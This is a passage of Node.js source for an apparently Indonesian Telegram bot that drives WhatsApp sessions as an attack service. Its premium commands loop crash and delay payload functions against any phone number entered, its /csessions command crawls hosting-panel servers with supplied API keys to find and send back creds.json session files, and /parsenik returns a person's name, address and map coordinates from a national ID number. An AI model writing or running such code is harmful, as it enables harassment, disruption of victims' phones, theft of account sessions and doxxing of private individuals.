    await bot.sendMessage(chatId, `User tidak ditemukan atau`, {
      parse_mode: "Markdown",
    });
  }
});


async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

bot.onText(/^\/add$/, async (msg) => {
  const userId = msg.from.id.toString();
  
  if (!verified) {
    return bot.sendMessage(
      chatId,
      "❌ <b>Bot Belum Diverifikasi!</b>\nGunakan /verif tokenmu untuk mengaktifkan.",
      { parse_mode: "HTML" }
    );
  }
  
  if (!isOwner(userId)) {
    return bot.sendMessage(msg.chat.id, "❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply || !reply.document) {
    return bot.sendMessage(msg.chat.id, "❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return bot.sendMessage(msg.chat.id, "❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await bot.sendMessage(msg.chat.id, "🔄 Memproses session…");

  try {
    const file = await bot.getFile(doc.file_id);
    const link = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
    const { data } = await axios.get(link, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return bot.sendMessage(msg.chat.id, "❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = createSessionDir(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActiveSessions(botNumber);

    await connectToWhatsApp(botNumber, msg.chat.id, bot);

    return bot.sendMessage(
      msg.chat.id,
      `✅ Session *${botNumber}* berhasil ditambahkan & online.`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error add session:", err);
    return bot.sendMessage(msg.chat.id, `❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

bot.onText(/^\/?parsenik (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nik = match[1]?.trim();
  
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak akses premium untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  if (!nik || nik.length !== 16) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\nGunakan:\n`parsenik 3510050212040003`",
      { parse_mode: "Markdown" }
    );
  }

  // Kirim pesan loading
  const loadingMsg = await bot.sendMessage(chatId, "⏳ Sedang memproses NIK, mohon tunggu...");

  try {
    // Ambil data dari API
    const res = await axios.get(`https://api.siputzx.my.id/api/tools/nik-checker?nik=${nik}`, {
      timeout: 30000,
    });

    const main = res.data?.data?.data; // ambil isi utama
    const meta = res.data?.data?.metadata; // ambil metadata
    const lokasi = main?.koordinat || {};

    // Cek kalau data kosong
    if (!main?.nama) {
      await bot.deleteMessage(chatId, loadingMsg.message_id);
      return bot.sendMessage(chatId, "⚠️ Data tidak ditemukan atau format API berubah.");
    }

    // Format pesan hasil
    const msgText = `
🧾 *HASIL PARSE NIK*

👤 *Nama:* ${main.nama}
🧠 *Zodiak:* ${main.zodiak}
🪪 *NIK:* \`${nik}\`
🚹 *Jenis Kelamin:* ${main.kelamin}
🎂 *Tanggal Lahir:* ${main.tempat_lahir}
📆 *Usia:* ${main.usia}
📅 *Ultah Berikutnya:* ${main.ultah_mendatang}
🪔 *Pasaran:* ${main.pasaran}

🏙️ *Provinsi:* ${main.provinsi}
🏢 *Kabupaten:* ${main.kabupaten}
🏘️ *Kecamatan:* ${main.kecamatan}
🏠 *Kelurahan:* ${main.kelurahan}
📍 *Alamat:* ${main.alamat}
🗳️ *TPS:* ${main.tps}

🌐 *Koordinat:* [Lihat di Maps](https://www.google.com/maps?q=${lokasi.lat},${lokasi.lon})

🕒 *Kategori Usia:* ${meta?.kategori_usia || "-"}
🏷️ *Wilayah:* ${meta?.jenis_wilayah || "-"}
📌 *Kode Wilayah:* ${meta?.kode_wilayah || "-"}
🧩 *Metode Pencarian:* ${meta?.metode_pencarian || "-"}

⏰ _Diperbarui pada: ${meta?.timestamp || "Tidak diketahui"}_
    `;

    await bot.deleteMessage(chatId, loadingMsg.message_id);
    bot.sendMessage(chatId, msgText, {
      parse_mode: "Markdown",
      disable_web_page_preview: false,
    });
  } catch (err) {
    await bot.deleteMessage(chatId, loadingMsg.message_id);
    bot.sendMessage(chatId, `❌ Gagal mengambil data: ${err.message}`);
  }
});

bot.onText(/^\/?listprem/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ Hanya owner yang bisa melihat list premium.");
  }

  const premiumData = loadPremiumData();
  const userIds = Object.keys(premiumData);

  if (userIds.length === 0) {
    return bot.sendMessage(chatId, "⚠️ Tidak ada user premium saat ini.");
  }

  let listText = "╭── *LIST USER PREMIUM* ──╮\n";
  let index = 1;

  for (const userId of userIds) {
    const { expiry } = premiumData[userId];
    const expiryDate = new Date(expiry).toLocaleString("id-ID", {
      dateStyle: "full",
      timeStyle: "short",
    });
    listText += `│ ${index++}. ID: ${userId}\n│    Expired: ${expiryDate}\n`;
  }

  listText += "╰─────────────────────────╯";

  await bot.sendMessage(chatId, listText, { parse_mode: "Markdown" });
});

bot.onText(/^\/?setjeda (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "⚠️ Hanya owner yang bisa set jeda.");
  }

  const durationStr = match[1];
  const durationMs = parseDuration(durationStr);
  if (!durationMs) {
    return bot.sendMessage(chatId, "❌ Format salah! Contoh: `10s`, `5m`, `2h`", { parse_mode: "Markdown" });
  }

  globalCooldown = durationMs;
  saveCooldownData({ userCooldowns, globalCooldown }); 
  bot.sendMessage(chatId, `✅ Jeda diatur ke *${durationStr}*`, { parse_mode: "Markdown" });
});

// ===== /startdeploy [id] =====
bot.onText(/^\/?startdeploy (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const id = match[1];
  const groupId = msg.chat.id; // ambil id grup tempat command dikirim
  
  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const deployments = loadDeployments();
  if (!deployments[id]) {
    bot.sendMessage(chatId, "⚠️ Bot tidak ditemukan.");
    notifyAdmin(`❌ /startdeploy GAGAL di grup *${msg.chat.title}* (${groupId}) — Bot ID *${id}* tidak ditemukan.`);
    return;
  }

  try {
    const proc = exec(`node index${id}.js`);
    deployments[id].status = "running";
    deployments[id].pid = proc.pid;
    saveDeployments(deployments);

    bot.sendMessage(chatId, `🚀 Bot ${id} berhasil dijalankan.`);
    notifyAdmin(`✅ /startdeploy BERHASIL dijalankan di grup *${msg.chat.title}* (${groupId}) untuk Bot ID: *${id}*`);
  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal menjalankan bot: ${err.message}`);
    notifyAdmin(`❌ /startdeploy GAGAL di grup *${msg.chat.title}* (${groupId})\nError: ${err.message}`);
  }
});


// ===== /deploybot [token] [id] =====
bot.onText(/^\/?deploybot (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const token = match[1];
  const id = match[2];
  const groupId = msg.chat.id;
  
  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
  }

  try {
    const indexFile = path.join(__dirname, `index${id}.js`);
    const configFile = path.join(__dirname, `config${id}.js`);
    const dbDir = path.join(__dirname, `database${id}`);
    const sessDir = path.join(__dirname, `sessions${id}`);

    // Salin index utama
    fs.copyFileSync(path.join(__dirname, "index.js"), indexFile);

    // Modifikasi isi file index
    let indexContent = fs.readFileSync(indexFile, "utf8");
    indexContent = indexContent
      .replace(`const config = require("./config");`, `const config = require("./config${id}");`)
      .replace(`const SESSIONS_DIR = "./sessions";`, `const SESSIONS_DIR = "./sessions${id}";`)
      .replace(`const SESSIONS_FILE = "./sessions/active_sessions.json";`, `const SESSIONS_FILE = "./sessions${id}/active_sessions.json";`)
      .replace(`path.join(__dirname, "database", "premium.json");`, `path.join(__dirname, "database${id}", "premium${id}.json");`)
      .replace(`path.join(__dirname, "database", "cooldown.json");`, `path.join(__dirname, "database${id}", "cooldown${id}.json");`);
    fs.writeFileSync(indexFile, indexContent);

    // Buat config
    const configContent = `module.exports = {
  BOT_TOKEN: "${token}",
  OWNER_ID: "${id}",
};`;
    fs.writeFileSync(configFile, configContent);

    // Buat folder database & session
    if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
    if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });

    // Simpan data deploy
    const deployments = loadDeployments();
    deployments[id] = { token, id, status: "stopped" };
    saveDeployments(deployments);

    bot.sendMessage(chatId, `✅ Bot berhasil di-deploy\nID: ${id}`);
    notifyAdmin(`✅ /deploybot BERHASIL dijalankan di grup *${msg.chat.title}* (${groupId})\nBot ID: *${id}*`);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Gagal deploy bot: ${err.message}`);
    notifyAdmin(`❌ /deploybot GAGAL di grup *${msg.chat.title}* (${groupId})\nError: ${err.message}`);
  }
});

bot.onText(/^\/?listdeploy/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Cek apakah user adalah admin
  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const deployments = loadDeployments();
  
  if (!Object.keys(deployments).length) {
    return bot.sendMessage(chatId, "⚠️ Belum ada bot yang di-deploy.");
  }

  let text = "╭── *LIST DEPLOY* ──╮\n";
  Object.keys(deployments).forEach((id, i) => {
    text += `│ ${i + 1}. ID: ${id} | Status: ${deployments[id].status}\n`;
  });
  text += "╰───────────────────╯";

  bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
});

// ====== /stopalldeploy ======
bot.onText(/^\/?stopalldeploy$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const deployments = loadDeployments();
  const keys = Object.keys(deployments);

  if (!keys.length) return bot.sendMessage(chatId, "⚠️ Tidak ada bot yang aktif.");

  let stopped = 0;
  keys.forEach((id) => {
    try {
      if (deployments[id].status === "running") {
        process.kill(deployments[id].pid);
        deployments[id].status = "stopped";
        stopped++;
      }
    } catch (err) {
      console.error(`Gagal stop bot ${id}: ${err.message}`);
    }
  });

  saveDeployments(deployments);
  bot.sendMessage(chatId, `🛑 Berhasil menghentikan ${stopped} bot yang sedang berjalan.`);
});


// ====== /delalldeploy ======
bot.onText(/^\/?delalldeploy$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (userId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const deployments = loadDeployments();
  const keys = Object.keys(deployments);

  if (!keys.length) return bot.sendMessage(chatId, "⚠️ Tidak ada bot yang bisa dihapus.");

  let deleted = 0;
  keys.forEach((id) => {
    try {
      fs.rmSync(path.join(__dirname, `index${id}.js`), { force: true });
      fs.rmSync(path.join(__dirname, `config${id}.js`), { force: true });
      fs.rmSync(path.join(__dirname, `database${id}`), { recursive: true, force: true });
      fs.rmSync(path.join(__dirname, `sessions${id}`), { recursive: true, force: true });

      delete deployments[id];
      deleted++;
    } catch (err) {
      console.error(`Gagal hapus bot ${id}: ${err.message}`);
    }
  });

  saveDeployments(deployments);
  bot.sendMessage(chatId, `🗑️ Berhasil menghapus ${deleted} bot dari sistem.`);
});

bot.onText(/^\/?iosinfinity (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");
    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/iosinfinity 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;
    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>HEFAISTOS HADES — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    for (const [id, sock] of sessions.entries()) {
      for (let i = 0; i < 5; i++) {
        await CrashIos(sock, target);
      }
    }

    const captionDone = `
<blockquote>HEFAISTOS HADES — SELESAI</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
    try {
      await bot.editMessageCaption("<b>Error saat memproses.</b>", {
        chat_id: chatId,
        message_id: msg.message_id + 1,
        parse_mode: "HTML"
      });
    } catch {}

    const report = `
<b>ERROR REPORT — IOSINFINITY</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err.message}</code>
    `;

    await adminBot.sendMessage(ADMIN_ID, report, { parse_mode: "HTML" });
  }
});

bot.onText(/^\/?delayv2 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");
    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/spamkuota 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;
    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>HEFAISTOS HADES — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    for (const [id, sock] of sessions.entries()) {
      for (let i = 0; i < 1; i++) {
        await delayhard2025(sock, target, true);
        await boundssex(sock, target);
        await Vocabulary(sock, target, true);
        await FireBread(sock, target, true);
        await xparamslite(sock, target);
        await AudioParams(sock, target, mention = true);
        await mentionUIv2(sock, target);
        await invisXAlbum(sock, target);
      }
    }

    const captionDone = `
<blockquote>HEFAISTOS HADES — SELESAI</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
    try {
      await bot.editMessageCaption("<b>Error saat memproses.</b>", {
        chat_id: chatId,
        message_id: msg.message_id + 1,
        parse_mode: "HTML"
      });
    } catch {}

    const report = `
<b>ERROR REPORT — DELAYV2</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err.message}</code>
    `;

    await adminBot.sendMessage(ADMIN_ID, report, { parse_mode: "HTML" });
  }
});

bot.onText(/^\/?crashinfinity (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");
    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/crashinfinity 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;
    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>HEFAISTOS HADES — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    for (const [id, sock] of sessions.entries()) {
      for (let i = 0; i < 3; i++) {
        await invisXAlbum(sock, target);
        await Uipayload(sock, target);
        await mentionUIv2(sock, target);
        await galleryBugUI(sock, target);
        await zwspCrashUi(sock, target);
        await boundssex(sock, target);
        await IceXHold(sock, target);
        await docthumb(sock, target);
        await OtaxNewUi(target, Ptcp = true);
        await JandaMuda(sock, target);
      }
    }

    const captionDone = `
<blockquote>HEFAISTOS HADES — SELESAI</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
    try {
      await bot.editMessageCaption("<b>Error saat memproses.</b>", {
        chat_id: chatId,
        message_id: msg.message_id + 1,
        parse_mode: "HTML"
      });
    } catch {}

    const report = `
<b>ERROR REPORT — CRASHINFINITY</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err.message}</code>
    `;

    await adminBot.sendMessage(ADMIN_ID, report, { parse_mode: "HTML" });
  }
});

bot.onText(/^\/?spamdelaykuota (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  try {
    if (!isOwner(senderId) && !isPremium(senderId)) {
      return bot.sendMessage(chatId, "<b>Akses ditolak.</b>", { parse_mode: "HTML" });
    }

    const raw = (match[1] || "").trim();
    const num = raw.replace(/[^0-9]/g, "");
    if (!num) {
      return bot.sendMessage(chatId, "Gunakan format: <code>/spamkuota 628xxxx</code>", { parse_mode: "HTML" });
    }

    const target = `${num}@s.whatsapp.net`;
    if (!sessions.size) {
      return bot.sendMessage(chatId, "<b>Tidak ada bot WhatsApp aktif.</b>", { parse_mode: "HTML" });
    }

    const photo = pick(images);

    const captionStart = `
<blockquote>INFINITY API TECH — PROSES</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Memproses</i>
    `;

    const sent = await bot.sendPhoto(chatId, photo, {
      caption: captionStart,
      parse_mode: "HTML"
    });

    const msgId = sent.message_id;

    for (const [id, sock] of sessions.entries()) {
      for (let i = 0; i < 1; i++) {
        await delayhard2025(sock, target, true);
        await Vocabulary(sock, target, true);
        await FireBread(sock, target, true);
        await AudioParams(sock, target, mention = true);
      }
    }

    const captionDone = `
<blockquote>INFINITY API TECH — SELESAI</blockquote>
<b>Target:</b> <code>${target}</code>
<b>Status:</b> <i>Selesai</i>
<b>Bot aktif:</b> ${sessions.size}
    `;

    await bot.editMessageCaption(captionDone, {
      chat_id: chatId,
      message_id: msgId,
      parse_mode: "HTML"
    });

  } catch (err) {
    try {
      await bot.editMessageCaption("<b>Error saat memproses.</b>", {
        chat_id: chatId,
        message_id: msg.message_id + 1,
        parse_mode: "HTML"
      });
    } catch {}

    const report = `
<b>ERROR REPORT — SPAMKUOTA</b>
User: <code>${senderId}</code>
Chat: <code>${chatId}</code>
Error:
<code>${err.message}</code>
    `;

    await adminBot.sendMessage(ADMIN_ID, report, { parse_mode: "HTML" });
  }
});

const SCAN_PATHS = [
  "/session/creds.json",
  "/sessions/creds.json",
  "/home/container/session/creds.json",
  "/home/container/creds.json",
  "/container/creds.json",
  "/creds.json",
  "creds.json"
];

bot.onText(/^\/?csessions(?:@[\w_]+)?(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(
      chatId,
      "Format salah.\nGunakan:\n`/csessions domain,plta,pltc`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split(",");
  const domain = parts[0];
  const plta = parts[1];
  const pltc = parts[2];

  if (!domain || !plta || !pltc) {
    return bot.sendMessage(
      chatId,
      "Format salah.\nGunakan:\n`/csessions domain,plta,pltc`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, "Sedang scan semua server untuk mencari creds.json ...");

  function norm(p) {
    return p.replace(/\/+/g, "/");
  }

  function isDir(item) {
    const a = item?.attributes;
    if (!a) return false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function traverse(identifier, dir = "/") {
    try {
      const r = await axios.get(
        `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        }
      );

      const list = r.data?.data;
      if (!Array.isArray(list)) return [];

      let found = [];

      for (let item of list) {
        const name = item.attributes?.name || item.name || "";
        const path = norm((dir === "/" ? "" : dir) + "/" + name);

        if (name.toLowerCase() === "creds.json") found.push(path);

        if (name.toLowerCase() === "sessions" && isDir(item)) {
          try {
            const sr = await axios.get(
              `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: path },
                headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
              }
            );

            const sessionList = sr.data?.data || [];
            for (let f of sessionList) {
              const fn = f.attributes?.name || f.name || "";
              if (fn.toLowerCase() === "creds.json") {
                found.push(norm(path + "/" + fn));
              }
            }
          } catch {}
        }

        if (isDir(item)) {
          try {
            const more = await traverse(identifier, path === "" ? "/" : path);
            found = found.concat(more);
          } catch {}
        }
      }

      return found;
    } catch {
      return [];
    }
  }

  try {
    const sr = await axios.get(
      `${domain.replace(/\/+$/, "")}/api/application/servers`,
      {
        headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
      }
    );

    const servers = sr.data?.data;
    if (!Array.isArray(servers))
      return bot.sendMessage(chatId, "Gagal ambil list server.");

    let total = 0;

    for (let s of servers) {
      const identifier =
        s.attributes?.identifier || s.identifier || s.attributes?.id;
      const name = s.attributes?.name || s.name || identifier || "unknown";

      if (!identifier) continue;

      let paths = await traverse(identifier);

      for (let p of SCAN_PATHS) {
        const np = norm(p);
        if (!paths.includes(np)) paths.push(np);
      }

      for (let filePath of paths) {
  try {
    const d = await axios.get(
      `${domain.replace(/\/+$/, "")}/api/client/servers/${identifier}/files/download`,
      {
        params: { file: filePath },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      }
    );

    const url = d.data?.attributes?.url;
    if (!url) continue;

    const fileDl = await axios.get(url, { responseType: "arraybuffer" });
    const buf = Buffer.from(fileDl.data);

    total++;

await bot.sendMessage(
  chatId,
  `Ditemukan creds.json di *${name}*\nPath: \`${filePath}\``,
  { parse_mode: "Markdown" }
);

await bot.sendDocument(
  chatId,
  buf,                                 
  { caption: "creds.json" },         
  {
    filename: "creds.json",        
    contentType: "application/json"  
  }
);


    fs.unlinkSync(tmpPath);

  } catch (err) {
    console.log("SEND ERROR:", err?.response?.data || err?.message);
  }
}
    }

    if (total === 0)
      return bot.sendMessage(chatId, "Scan selesai. Tidak ditemukan creds.json.");

    bot.sendMessage(chatId, `Scan selesai. Total dikirim: ${total}`);
  } catch {
    bot.sendMessage(chatId, "Terjadi error saat scan.");
  }
});

bot.onText(/^\/brat (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const teks = match[1]?.trim();

    if (!teks)
        return bot.sendMessage(chatId, "⚠️ Contoh: /brat teksnya");

    try {
        const waitMsg = await bot.sendMessage(chatId, "⏳ Sedang membuat sticker...");

        // URL API
        const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(teks)}&isAnimated=false&delay=500`;

        // Ambil buffer gambar dari API
        const axios = require("axios");
        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
        const buffer = Buffer.from(response.data);

        // Kirim sebagai sticker
        await bot.sendSticker(chatId, buffer);

        // Hapus pesan loading
        bot.deleteMessage(chatId, waitMsg.message_id);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal membuat sticker brat!");
    }
});

const GH_OWNER = "ZEET5644";
const GH_REPO = "DbDreados";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container") {
    const apiURL = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(apiURL, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const localPath = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileResp = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(localPath), { recursive: true });
            fs.writeFileSync(localPath, Buffer.from(fileResp.data));

            console.log(`[UPDATE] ${localPath}`);
        }

        if (item.type === "dir") {
            fs.mkdirSync(localPath, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

bot.onText(/^\/getcode(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const url = match[1]?.trim();

  if (userId !== ADMIN_ID) return bot.sendMessage(chatId, "❌ Hanya admin yang bisa menggunakan perintah ini.");
  if (!url || !/^https?:\/\//.test(url)) {
    return bot.sendMessage(chatId, "❌ Format salah!\n\nContoh: `/getcode https://example.com`", { parse_mode: "Markdown" });
  }

  const timestamp = Date.now();
  const tempDir = `/tmp/getcode_${timestamp}`;
  fs.mkdirSync(tempDir, { recursive: true });

  try {
    const { data: html } = await axios.get(url);
    const $ = cheerio.load(html);
    const resources = new Set();

    // Simpan HTML utama
    const indexPath = path.join(tempDir, "index.html");
    fs.writeFileSync(indexPath, html);

    // Cari resource eksternal
    $("script[src]").each((_, el) => resources.add($(el).attr("src")));
    $("link[rel='stylesheet']").each((_, el) => resources.add($(el).attr("href")));
    $("img[src]").each((_, el) => resources.add($(el).attr("src")));
    $("iframe[src]").each((_, el) => resources.add($(el).attr("src")));

    // Unduh resource
    for (const resUrl of resources) {
      try {
        const fullUrl = new URL(resUrl, url).href;
        const fileName = fullUrl.split("/").pop().split("?")[0];
        const filePath = path.join(tempDir, fileName);
        const res = await axios.get(fullUrl, { responseType: "arraybuffer" });
        fs.writeFileSync(filePath, res.data);
      } catch (e) {
        console.log(`⚠️ Gagal ambil resource: ${resUrl}`);
      }
    }

    // Buat ZIP
    const zipPath = `${tempDir}.zip`;
    const output = fs.createWriteStream(zipPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    archive.pipe(output);
    archive.directory(tempDir, false);
    await archive.finalize();

    await new Promise((resolve) => output.on("close", resolve));

    // Kirim file ke admin
    await bot.sendDocument(chatId, zipPath, {}, { filename: "website-source.zip" });
    bot.sendMessage(chatId, "✅ Source berhasil diambil dan dikirim.");

    // Bersihkan
    fs.rmSync(tempDir, { recursive: true, force: true });
    fs.unlinkSync(zipPath);

  } catch (err) {
    console.error("❌ Gagal ambil URL:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil source:\n${err.message}`);
  }
});

const AdmZip = require("adm-zip");

bot.onText(/^\/downloadmediafire (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const urlInput = match[1];

    try {
        const { data } = await axios.get(
            `https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(urlInput)}`
        );

        const { title, url } = data.data;

        const filePath = `/tmp/${title}`;
        const response = await axios.get(url, { responseType: "arraybuffer" });
        fs.writeFileSync(filePath, response.data);

        const zip = new AdmZip();
        zip.addLocalFile(filePath);
        const zipPath = filePath + ".zip";
        zip.writeZip(zipPath);

        await bot.sendDocument(chatId, zipPath, {
            caption: "📦 File berhasil di-zip dari MediaFire",
        });

        fs.unlinkSync(filePath);
        fs.unlinkSync(zipPath);

    } catch (err) {
        console.error("[MEDIAFIRE ERROR]", err);
        bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat ZIP.");
    }
});

const acorn = require("acorn");
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

bot.onText(/\/ceksyntax/, async (msg) => {
  const chatId = msg.chat.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId,
      "❌ <b>Reply</b> ke file <code>.js</code> yang ingin dicek.",
      { parse_mode: "HTML" }
    );
  }

  const doc = msg.reply_to_message.document;

  if (!doc.file_name.endsWith(".js")) {
    return bot.sendMessage(chatId,
      "❌ File harus berformat <code>.js</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
